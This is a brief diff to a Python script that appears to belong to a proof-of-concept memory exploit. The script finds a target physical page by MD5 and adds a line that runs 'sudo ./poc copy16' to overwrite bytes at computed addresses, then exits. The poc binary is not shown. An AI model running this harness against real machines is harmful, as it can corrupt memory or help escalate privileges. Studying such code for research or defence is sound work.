@@ -51,7 +51,9 @@ def get_page_md5(gpa):
         target_addr = base_addr + offset
         print(f"Calculated target address: {gpa} + 0x{offset:x} = 0x{target_addr:x}")
         print(f"Addresses to replace: 0x{target_addr:x} and 0x{target_addr + 0x10:x}")
-        print("")
+        print(f"Replace command: sudo ./poc copy16 0x{target_addr:x} 0x{target_addr + 0x20:x} 0 0")
+        os.system(f"sudo ./poc copy16 0x{target_addr:x} 0x{target_addr + 0x20:x} 0 0")
+        exit()
     with open("md5.txt", "a") as f:
         f.write(f'Page {gpa} Feature sequence MD5: {md5sum}\n')
     os.system("dmesg -c")
